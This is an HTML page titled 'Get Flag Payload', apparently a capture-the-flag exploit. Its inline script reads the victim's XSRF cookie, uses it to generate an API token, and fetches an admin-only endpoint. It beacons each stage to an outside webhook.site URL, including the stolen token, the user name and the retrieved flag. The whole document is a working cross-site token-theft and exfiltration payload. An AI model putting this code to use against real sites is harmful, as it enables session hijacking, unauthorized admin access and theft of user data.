<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Get Flag Payload</title>
</head>
<body>
  <h1>Get Flag Payload Page</h1>
  <script>
    (function () {
      const webhookUrl = "https://webhook.site/0a90930c-2196-4924-aac4-470557244914";
      const loc = window.location.href;

      function sendPing(data) {
        const params = new URLSearchParams();
        params.append("source_tag", "script_GET_FLAG_V1");
        for (const key in data) {
          const value = String(data[key]).substring(0, 1000);
          params.append(key, value);
        }
        new Image().src = `${webhookUrl}?${params.toString()}`;
      }

      function getXSRFToken() {
        const match = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
        return match ? decodeURIComponent(match[1]) : null;
      }

      const xsrfToken = getXSRFToken();

      if (!xsrfToken) {
        sendPing({ stage: "xsrf_token_missing", loc });
        return;
      }

      sendPing({ stage: "script_started", loc, xsrf_preview: xsrfToken.substring(0, 20) });

      // Step 1: Get API token
      fetch("/generate-token", {
        method: "POST",
        headers: {
          "Accept": "application/json",
          "X-Requested-With": "XMLHttpRequest",
          "X-XSRF-TOKEN": xsrfToken
        }
      })
        .then(res => {
          if (!res.ok) {
            return res.text().then(body => {
              sendPing({ stage: "gen_token_FAIL", status: res.status, body });
              throw new Error("Gen token failed");
            });
          }
          return res.json();
        })
        .then(data => {
          if (!data.token) {
            sendPing({ stage: "token_missing", data: JSON.stringify(data) });
            throw new Error("Token missing");
          }

          const apiToken = data.token;
          sendPing({ stage: "got_token", token: apiToken, user: data.user?.name || "N/A" });

          // Step 2: Get flag
          return fetch("/api/admin/sup3rs3cr3t", {
            headers: {
              "Accept": "application/json",
              "Authorization": "Bearer " + apiToken,
              "X-Requested-With": "XMLHttpRequest"
            }
          });
        })
        .then(res => {
          if (!res.ok) {
            return res.text().then(body => {
              sendPing({ stage: "flag_fetch_FAIL", status: res.status, body });
              throw new Error("Flag fetch failed");
            });
          }
          return res.json();
        })
        .then(flagData => {
          sendPing({ stage: "flag_success", flag: JSON.stringify(flagData) });
        })
        .catch(err => {
          sendPing({ stage: "catch_error", message: err.message });
        });
    })();
  </script>
</body>
</html>
